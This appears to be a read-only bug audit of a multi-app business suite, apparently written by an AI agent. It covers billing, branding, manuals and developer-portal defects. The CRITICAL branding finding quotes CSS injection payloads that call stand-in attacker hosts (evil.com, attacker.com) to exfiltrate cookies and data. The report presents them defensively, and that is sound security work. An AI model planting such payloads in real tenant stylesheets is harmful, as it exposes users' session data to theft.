# BSU + braden + throughput — Deep Bug Excavation

**Audit date:** 2026-07-25
**Scope:** `business-suite-unified`, `braden`, `throughput` — code-level bug hunt (READ-ONLY)
**Focus areas:** Developer Portal, Manuals integrity, Billing, Branding
**Mode:** READ-ONLY — no code changes, no git operations
**Auditor:** Hermes Agent (deep static analysis + cross-file trace)
**Companion to:** `20260725-bsu-braden-throughput-docs-code-audit-v1.00W.md` (docs-vs-code audit)
**Severity taxonomy:** CRITICAL · HIGH · MEDIUM · LOW · INFO

---

## 1. Executive summary

This excavation targeted runtime/logic bugs (not doc drift) across the four focus areas in the BSuite monorepo. 12 confirmed bugs found, 3 of them CRITICAL/HIGH security or data-integrity issues. All findings are READ-ONLY observations with exact file:line evidence and reproduction reasoning.

| # | Area | Severity | One-line |
|---|------|----------|----------|
| 1 | Branding | **CRITICAL** | Tenant `custom_css` injected raw into `<style>` — bypasses `branding-sanitize` |
| 2 | Billing | **HIGH** | `Billing.tsx` renders per-app tiers (r80_pro, conduit_pro, throughput_*) as broken "$0/seat/mo" CRM7 plan cards; "Upgrade" 400s for r80_pro/conduit_pro |
| 3 | Branding | **HIGH** | Token drift: `--color-primary` (purple) ≠ `--primary` (blue) — primary color inconsistent across aliases |
| 4 | Billing | **MEDIUM** | `billing_events` query has no tenant filter → multi-tenant users see all tenants' events mixed |
| 5 | Billing | **MEDIUM** | `derivePlanType` fallback missing AI addon price IDs → AI addon checkouts with no metadata get `'basic'` tier |
| 6 | Developer Portal | **MEDIUM** | Dead code: `Lock` import + `!layer.live` branch unreachable (all 8 layers `live: true`) |
| 7 | Manuals | **MEDIUM** | `Docs.tsx` deep-link scroll effect ignores hash changes — in-manual anchor nav broken |
| 8 | Manuals | **LOW** | `routeManualMap` `/developer/pages` → `page-builder` is unreachable (no `pages` tab) |
| 9 | Manuals | **LOW** | `getManual()` throws on unknown block → unhandled, crashes Docs page (no error boundary) |
| 10 | Billing | **LOW** | `charge-calc` division by zero when `billableWk` or `daysPerWeek` = 0 |
| 11 | Branding | **LOW** | `bsu-gradient` CSS class defined but has zero usages (dead, bsuite#571 unwired) |
| 12 | Developer Portal | **INFO** | `AppSlug` union mismatch: Developer/Branding writes `throughput`/`ideas` slugs that `useBranding` can't read |

---

## 2. Developer Portal

### BUG-06 — Dead `Lock` import + `!layer.live` branch in FeatureBuilder shell [MEDIUM]

**File:** `business-suite-unified/src/pages/Developer/FeatureBuilder/index.tsx:13,146-170`

**Evidence:** All 8 layers are declared `live: true` (lines 39-47), so the `!layer.live` conditional branches (lines 153, 155, 163, 166-168) are unreachable dead code. The `Lock` icon import (line 13) is only referenced inside that dead branch. The `title`, `aria-label`, and `opacity-60` className logic for stub layers never executes.

**Impact:** No runtime impact — pure dead code. Misleading to future maintainers (suggests stub layers exist). The `StubPanel` component IS still used legitimately by `PermissionsPanel.tsx:109` as an empty-state when no entity is defined — that usage is correct and NOT dead.

**Fix:** Remove the `Lock` import, the `!layer.live` ternaries, and the stub-layer className branch. Keep `StubPanel` (still used by PermissionsPanel empty-state).

### BUG-08 — `routeManualMap` has unreachable `/developer/pages` entry [LOW]

**File:** `business-suite-unified/src/lib/manuals/routeManualMap.ts:49`

**Evidence:** Line 49 maps `/developer/pages` → developer manual `page-builder` section. But the Developer Portal sub-nav (`index.tsx:48-71`) has NO `pages` tab — the tabs are `website`, `tenant`, `tenants`, `features`, `tables`, `logs`, `functions`, `feature-builder`, `access`, `notices`, `routing`, `embed`, `rate-limits`, `platform`, `nav`, `marketing`, `branding`. A request to `/developer/pages` hits `DeveloperRouteFallback` (`index.tsx:194-197`) which redirects to `/developer/website`. So this map entry is never matched.

**Impact:** Dead map entry. The `page-builder` deep-link is still reachable via `/docs/developer#page-builder` directly, just not via the route map.

**Fix:** Remove the `/developer/pages` entry, or add a `pages` alias to the sub-nav if the Page Builder should have its own tab.

### BUG-12 — `AppSlug` union mismatch between Developer/Branding and useBranding [INFO]

**Files:**
- `business-suite-unified/src/pages/Developer/Branding.tsx:25-34` — `APP_SLUGS = ['platform','bsu','crm7','conduit','braden','r8','throughput','ideas']`
- `business-suite-unified/src/hooks/useBranding.ts:43` — `AppSlug = 'crm7' | 'conduit' | 'r8' | 'braden' | 'bsu'`

**Evidence:** Developer/Branding writes platform_branding rows for `throughput` and `ideas` slugs, but `useBranding`'s `AppSlug` type doesn't include them. The `tenant_app_branding` query (line 422) uses `.eq('app_slug', appSlug)` where `appSlug` is the 5-value union — so per-tenant-per-app branding for `throughput`/`ideas` can't be read by the BSU hook. Those apps presumably manage their own branding in-repo, but the Developer/Branding page surfaces editing affordances for slugs the BSU runtime can't consume.

**Impact:** Low — branding set for `throughput`/`ideas` via the Developer Portal is written to `platform_branding` (Tier 1, readable by all) but not to `tenant_app_branding` (Tier 3). Tier 1 reads don't filter by app_slug, so the logos/colors DO apply as platform defaults. The mismatch is a type-safety gap, not a functional break.

---

## 3. Manuals integrity

### BUG-07 — Deep-link scroll effect ignores hash changes [MEDIUM]

**File:** `business-suite-unified/src/pages/Docs.tsx:85-91`

**Evidence:**
```tsx
useEffect(() => {
  if (!manualId) return
  const hash = window.location.hash.slice(1)
  if (!hash) return
  const el = document.getElementById(hash)
  el?.scrollIntoView({ behavior: 'smooth' })
}, [manualId])  // ← hash not in deps
```

The effect depends only on `[manualId]`. When a user is already on `/docs/developer` and clicks an in-page TOC link to `/docs/developer#feature-builder`, `manualId` doesn't change → effect doesn't re-fire → no scroll. The browser's native hash handling DOES scroll on click, but if the section is below the fold and React re-renders, the scroll position can be lost. The effect works correctly on initial load with a hash (deep-link from an external page) but not for in-app navigation between sections of the same manual.

**Impact:** In-page TOC links (`<a href="#section">` in `ManualRenderer.tsx:141`) rely on native browser anchor scrolling, which works. But the React effect's stated purpose ("when navigating between manuals the element may not exist yet — re-scroll once the target is in the DOM") only fires on manual change, not hash change. A user navigating from `/docs/developer#feature-builder` to `/docs/developer#navigation` via the TOC gets native scroll (works), but a programmatic `navigate('/docs/developer#navigation')` from elsewhere won't trigger the effect.

**Fix:** Add `window.location.hash` to the dependency array, or use `useLocation().hash` from react-router.

### BUG-09 — `getManual()` throws on unknown block, no error boundary [LOW]

**Files:**
- `business-suite-unified/src/lib/manuals/registry.ts:60-63` — `resolveSection` throws `Error` if a block id is not in the registry
- `business-suite-unified/src/pages/Docs.tsx:97` — `const manual = getManual(manualId)` called during render

**Evidence:** `getManual` is synchronous and throws if any section references an unknown block id. `Docs.tsx` calls it at render time (line 97) with no try/catch and no enclosing `<ErrorBoundary>`. If a block is removed from the registry but still referenced by a manual, the entire `/docs/:manualId` page crashes with a white screen. The integrity tests (`manuals.test.ts`) catch this in CI, but a runtime regression (e.g. a bad block id shipped) would crash the page rather than show a graceful error.

**Impact:** Low — CI integrity tests prevent this from shipping. But the failure mode is a crash, not a graceful error, if it ever occurs.

**Fix:** Wrap `getManual` in try/catch in `Docs.tsx` and render a fallback, or add an `<ErrorBoundary>` around the `ManualRenderer`.

### Cross-manual duplicate section IDs [INFO, not a bug]

9 section IDs appear in more than one manual (`email-assignment`, `funding-offsets`, `getting-started`, `jodie`, `leave`, `page-editing`, `placements`, `recruitment-handover`, `training-contracts`). This is NOT a bug — each manual lives under a different `/docs/:manualId` route, so the `<section id="...">` anchors are scoped to different pages. No within-manual duplicates exist (verified per-file). Deep-links like `/docs/developer#getting-started` and `/docs/employee#getting-started` resolve correctly to different pages.

---

## 4. Billing

### BUG-02 — `Billing.tsx` renders per-app tiers as broken CRM7 plan cards [HIGH]

**File:** `business-suite-unified/src/pages/Billing.tsx:425-513`

**Evidence:** The "Available Plans" grid iterates ALL `SUBSCRIPTION_TIERS` entries:
```tsx
(Object.entries(SUBSCRIPTION_TIERS) as ...)
  .filter(([key]) => key !== 'developer' && key !== 'free')
  .map(([key, tierData]) => {
    const prices = PLAN_PRICES[key as keyof typeof PLAN_PRICES]  // undefined for r80_pro, conduit_pro, throughput_*
    const displayPrice = prices ? ... : 0  // → 0
    ...
```

`SUBSCRIPTION_TIERS` (defined in `src/lib/supabase.ts:221+`) includes `r80_pro`, `conduit_pro`, `throughput_essentials`, `throughput_professional`, `throughput_enterprise`. But `PLAN_PRICES` (in `src/lib/pricing.ts:20-24`) only has `basic`, `professional`, `enterprise`. So the per-app tiers render as:
- **"$0 /seat/mo"** (displayPrice = 0 because `prices` is undefined)
- Wrong unit (`/seat/mo` — these are flat-rate, not per-seat)
- Wrong features list under a CRM7-style "Available Plans" grid (e.g. "Throughput Enterprise" showing "Idea capture & organisation" next to a "$0/seat/mo" price)
- `TIER_RANK` (line 57-63) only has `free/basic/professional/enterprise/developer` — per-app tiers get `TIER_RANK[key] ?? 0`, so they appear as rank-0 (lowest) and are always shown as "Upgrade" regardless of the user's current tier.

**Upgrade button 400s:** `handleUpgrade(key)` (line 487) passes `key` like `'r80_pro'` or `'conduit_pro'` to `createCheckoutSession(finalPlanKey, ...)`. But `PLAN_PRICE_MAP` in `create-subscription/index.ts:10-35` uses PlanType keys (`r80_monthly`, `conduit_monthly`), NOT tier keys (`r80_pro`, `conduit_pro`). The edge function returns 400 "Invalid planType: r80_pro". So clicking "Upgrade" on the R8/Conduit cards in the per-seat grid throws a checkout error.

Note: `throughput_essentials`/`throughput_professional`/`throughput_enterprise` happen to match PlanType keys, so their checkout would succeed — but they still render as "$0/seat/mo" with the wrong unit and wrong grid context.

**Impact:** Every user visiting `/billing` sees 5 broken plan cards (R8, Conduit, 3× Throughput) showing "$0/seat/mo" with incorrect features and a non-functional Upgrade button for R8/Conduit. The standalone R8 section (lines 555-622) and the per-app pricing are handled separately below the grid, so this is pure visual breakage + failed checkout for the per-app tiers wrongly included in the per-seat grid.

**Fix:** Filter `SUBSCRIPTION_TIERS` to only CRM7 per-seat tiers in the grid: `.filter(([key]) => ['basic','professional','enterprise'].includes(key))`. The per-app tiers (R8, Conduit, Throughput) are already surfaced in their own dedicated sections (R8 at 555-622, Throughput/AI in the line items + addons).

### BUG-04 — `billing_events` query has no tenant filter [MEDIUM]

**File:** `business-suite-unified/src/pages/Billing.tsx:107-111`

**Evidence:**
```tsx
const { data } = await supabase
  .from('billing_events')
  .select('id, event_type, data, created_at')
  .order('created_at', { ascending: false })
  .limit(10)
```

No `.eq('tenant_id', tenantId)` filter. RLS (migration `20260411000000_fix_rls_initplan_and_fk_indexes.sql:121-126`) scopes to `tenant_id IN user_tenants OR platform_role IN ('developer','platform_admin')`. So:
- A user belonging to multiple tenants sees billing events from ALL their tenants mixed together (no way to distinguish which tenant an event belongs to — the `data` column has it but the UI doesn't show it).
- A developer/platform_admin sees ALL tenants' billing events (by design, but the UI gives no tenant context).

**Impact:** Multi-tenant users get a confusing mixed feed. Platform admins see all events (arguably intentional for support, but the UI should label the tenant).

**Fix:** Add `.eq('tenant_id', tenantId)` when `tenantId` is available; for platform admins, show the tenant_id column in the table.

### BUG-05 — `derivePlanType` missing AI addon price IDs [MEDIUM]

**File:** `business-suite-unified/supabase/functions/stripe-webhook/index.ts:302-330`

**Evidence:** `derivePlanType(subscription)` maps Stripe price IDs to tier keys. The `priceToTier` map (lines 306-327) includes CRM7, R80, Conduit, and Throughput price IDs — but NOT the AI addon price IDs (`price_1T52Mx`, `price_1T52Mz`, `price_1T52N0` defined in `create-subscription/index.ts:32-34`). If a checkout has no `plan_type` metadata (e.g. metadata lost, or a subscription created manually in the Stripe dashboard), `normalizePlanTier(null, subscription)` falls through to `derivePlanType`, which returns `'basic'` for any AI addon subscription. This would incorrectly mark an AI addon subscriber as a CRM7 basic subscriber.

**Impact:** Low probability (metadata is set by `create-subscription`), but high severity if hit — an AI addon customer gets CRM7 basic tier access instead of just the AI addon, or the subscription row gets the wrong `plan_tier`.

**Fix:** Add the AI addon price IDs to `derivePlanType`'s `priceToTier` map, or handle AI addons as a separate column (they're already stored in `ai_addon`, but `derivePlanType` is about `plan_tier`).

### BUG-10 — `charge-calc` division by zero [LOW]

**Files:**
- `packages/charge-calc/src/billing.ts:40-43` — `standardBillableWeeks` divides by `input.daysPerWeek`
- `packages/charge-calc/src/calculate.ts:213-214` — `billedWage = (recv * tHrs) / bHrs`; `ordCost = totCost / bHrs + ...`

**Evidence:**
1. `standardBillableWeeks`: if `daysPerWeek === 0`, the three divisions produce `Infinity`/`NaN`. `daysPerWeek` defaults to 5 (`defaults.ts:51`) but is configurable via `CalcConfig.daysPerWeek`.
2. `calculate.ts:204`: `bHrs = billableWk * hpw`. If `billableWk === 0` (which `calculateBillableWeeks` returns when `52 - alWeeks - phWeeks - sickWeeks - trainWk <= 0`, i.e. leave+training ≥ 52 weeks), then `bHrs = 0` → lines 213-214 divide by zero → `Infinity` propagates through all per-hour rates.

**Impact:** Edge case (a worker with ≥52 weeks of leave+training is unrealistic), but produces `Infinity`/`NaN` rather than a graceful error. Realistic edge: a part-time worker with `daysPerWeek=0` (not currently validated) would hit it.

**Fix:** Guard `daysPerWeek > 0` and `bHrs > 0` with early returns or throw a descriptive error.

---

## 5. Branding

### BUG-01 — Tenant `custom_css` injected raw, bypasses `branding-sanitize` [CRITICAL]

**Files:**
- `business-suite-unified/src/hooks/useBranding.ts:307-318` — `applyBrandingVars` injects `custom_css` raw
- `business-suite-unified/src/pages/Admin/brandingRow.ts:36` — `buildBrandingRow` stores `customCss` raw
- `business-suite-unified/src/pages/Branding.tsx:978` — textarea accepts arbitrary CSS
- `business-suite-unified/src/lib/branding-sanitize.ts:1-27` — claims to cover "every write path" but does NOT sanitize `custom_css`

**Evidence:** The `branding-sanitize.ts` module's header comment (lines 18-22) explicitly states:
> "these helpers therefore run at the DOM-apply boundary — `useBranding`'s `applyBrandingVars` and `BrandingProvider`'s `applyBrandingToRoot` — so every write path is covered, not just the admin UI."

But `applyBrandingVars` (line 315):
```ts
el.textContent = b.custom_css;  // ← raw tenant-controlled CSS, no sanitization
```

The `custom_css` column is writable by semi-trusted tenant admins (per the sanitize module's own threat model, lines 17-19: "writable by semi-trusted platform/tenant admins, and can also be written by sibling apps or direct SQL"). A tenant admin can inject:
- `@import url('https://evil.com/exfil?cookie=...')` — load external stylesheets (data exfil)
- `background: url('https://evil.com/track?data=...')` — tracking pixels / data exfiltration via CSS `url()`
- `--brand-logo-light: url('javascript:alert(1)')` — though `javascript:` in CSS `url()` is blocked by modern browsers, `data:` URLs and cross-origin `https:` URLs work

The `branding-sanitize` module meticulously sanitizes `font_family` (rejects `()`, `;`, `{}`, `@`, `\\`), `logo_url` (only `http:`/`https:` schemes, rejects `//` protocol-relative), and `toCssString` (escapes `"` and `\\`). But `custom_css` — the most dangerous field because it's a full CSS stylesheet, not a single value — is applied as raw `textContent` with zero filtering.

**Reproduction:** A tenant admin navigates to `/branding`, enters `@import url('https://attacker.com/steal')` in the "Custom CSS" textarea, clicks save. The CSS is stored raw in `tenant_branding.custom_css` and injected verbatim into a `<style id="tenant-branding-custom-css">` tag on every page load for that tenant. The `@import` fetches attacker-controlled CSS, which can contain `background: url(...)` calls that exfiltrate the user's session data or perform CSS-based data theft.

**Impact:** CSS injection by tenant admins. While tenant admins are "semi-trusted," the security model explicitly claims this write path is covered by sanitization — it is not. CSS injection enables data exfiltration (via `url()` to attacker origins), UI redressing (overriding critical UI elements), and resource loading from arbitrary origins. This is the single most severe finding.

**Fix:** Either (a) remove the `custom_css` feature (the sanitize module's approach of structured fields + sanitization is safer), or (b) implement a CSS sanitizer that strips `@import`, `url()` with non-allowlisted origins, `expression()`, and other injection vectors — or (c) restrict `custom_css` to a sandboxed `<iframe>` / CSS containment context so it can't affect the parent app shell. At minimum, update the `branding-sanitize.ts` header to stop claiming `custom_css` is covered.

### BUG-03 — Primary color token drift: `--color-primary` ≠ `--primary` [HIGH]

**File:** `business-suite-unified/src/index.css:49,119,736`

**Evidence:**
- Line 49: `--accent-primary: oklch(0.541 0.247 293.0);` — **Electric Purple** (hue 293)
- Line 119: `--color-primary: var(--accent-primary);` → resolves to **purple** oklch(0.541 0.247 293)
  - Comment self-documents the drift: *"resolves to BSU's own fallback oklch(0.541 0.247 293) Electric Purple (index.css :49), NOT the Electric Blue this comment previously claimed."*
- Line 736: `--primary: oklch(0.546 0.215 262.9);` — **Electric Blue** (hue 262.9)
  - Comment falsely claims: *"Electric Blue — --accent-primary"* — but `--accent-primary` is purple (293), not blue (262.9).

So `--color-primary` (purple) and `--primary` (blue) are two different colors both serving as "primary." Components using Tailwind's `text-primary` / `bg-primary` (which map to `--primary` = blue) get blue. Components using `var(--color-primary)` directly get purple. The `bsu-gradient` class (line 1253-1255) uses `--accent-primary`/`--accent-secondary` (purple→light-purple), while `neon-text` (line 1033-1034) uses `from-primary to-accent` (blue→cyan). The wordmark gradient and the heading gradient use different palettes.

**Impact:** The "primary" brand color is inconsistent. A component using `text-primary` (blue) next to one using `var(--color-primary)` (purple) will visibly mismatch. This affects any surface mixing legacy `--color-*` tokens with Tailwind `--primary` tokens. The `--color-primary` alias exists for backward compat with older stylesheets, but it resolves to a different color than the canonical `--primary`.

**Fix:** Make `--color-primary` alias `--primary` (both blue), or eliminate one alias. Update the misleading comment on line 736. Verify `@bsuite/theme` doesn't define `--accent-primary` independently (the line 119 comment says it doesn't, so the BSU fallback at line 49 wins — that fallback should match `--primary`).

### BUG-11 — `bsu-gradient` CSS class is dead code (bsuite#571 unwired) [LOW]

**File:** `business-suite-unified/src/index.css:1253-1265`

**Evidence:** The `.bsu-gradient` class (added for bsuite#571 "purple accent") is defined with a `linear-gradient(135deg, var(--accent-primary), var(--accent-secondary))` and a `forced-colors` fallback — but has **zero usages** in any component:
```
grep -rn "bsu-gradient" src/ | grep -v node_modules | grep -v __tests__ | grep -v '.test.' | grep -v index.css
(0 results)
```

**Impact:** Dead CSS. The intended purple wordmark gradient (bsuite#571) was authored but never wired into the wordmark component. The wordmark currently uses `neon-text` (blue→cyan) via `bg-linear-to-r from-primary to-accent`.

**Fix:** Either wire `bsu-gradient` into the wordmark component (per bsuite#571's intent) or remove the dead CSS.

---

## 6. Reproduction notes (no fixes applied — READ-ONLY)

All findings are observational. No files were modified. Evidence was gathered via:
- `read_file` on source files (exact line numbers cited above)
- `grep`/`search_files` for token usage, imports, and cross-references
- Cross-file trace: `stripeService.ts` → `create-subscription/index.ts` → `stripe-webhook/index.ts` → `SUBSCRIPTION_TIERS` in `supabase.ts` → `PLAN_PRICES` in `pricing.ts` → `Billing.tsx` render path
- `branding-sanitize.ts` header claims vs `useBranding.ts:307-318` actual `custom_css` handling
- `index.css` token alias chain: `--color-primary` → `--accent-primary` → oklch values

### Verified-clean (no bug found)

| Check | Verification |
|-------|--------------|
| Manuals block registry integrity | 55 referenced blocks, 55 defined, all resolve (no missing blocks) |
| Manuals within-manual section ID uniqueness | 0 within-manual duplicates (9 cross-manual duplicates are fine — different routes) |
| `routeManualMap` section targets | All 14 mapped (manual, section) targets resolve to existing sections |
| Stripe webhook `normalizePlanTier` monthly-throughput mapping | `throughput_essentials`/`professional`/`enterprise` PlanType keys == SUBSCRIPTION_TIERS keys (correct by accident) |
| Stripe webhook signature verification | `stripe.webhooks.constructEvent` with `STRIPE_WEBHOOK_SECRET` — sound |
| `create-subscription` body size cap + rate limit + origin allowlist | All present (lines 89-103, 106-115, 238-259) |
| `billing_events` RLS scoping | Properly scoped to `user_tenants` OR platform_admin (migration 20260411000000:121-126) |
| FeatureBuilder store RLS | `feature_builder_drafts` RLS-scoped to `dev_user_id` (per store header comment) |
| `branding-sanitize` URL/font/string helpers | All sound — regex-free, scheme allowlist, forbidden-token rejection |
| AccessGuard tier + RBAC gating | `hasServiceAccess` + `hasPermission` + `isRoleAtLeast` all checked in sequence |

---

## 7. Self-report

- **Scope:** BSU only (developer portal, manuals, billing, branding all live in `business-suite-unified`). braden and throughput were checked for cross-cutting impact but contain no developer-portal, manuals, billing, or branding code of their own — those surfaces are BSU-central.
- **Methodology:** Static analysis with exact file:line evidence. Every finding traces the bug from definition to impact. No runtime execution was performed (READ-ONLY).
- **Most severe:** BUG-01 (custom_css injection) is a CRITICAL security gap that contradicts the repo's own `branding-sanitize` security model. BUG-02 (broken per-app tier cards on Billing) is a HIGH user-facing breakage visible to every user visiting `/billing`. BUG-03 (primary token drift) is a HIGH branding integrity issue affecting color consistency across the app.
- **Companion audit:** This report complements `20260725-bsu-braden-throughput-docs-code-audit-v1.00W.md` (which found doc drift). The doc audit found 23 STALE docs; this excavation found 12 runtime bugs — the two are independent issue classes.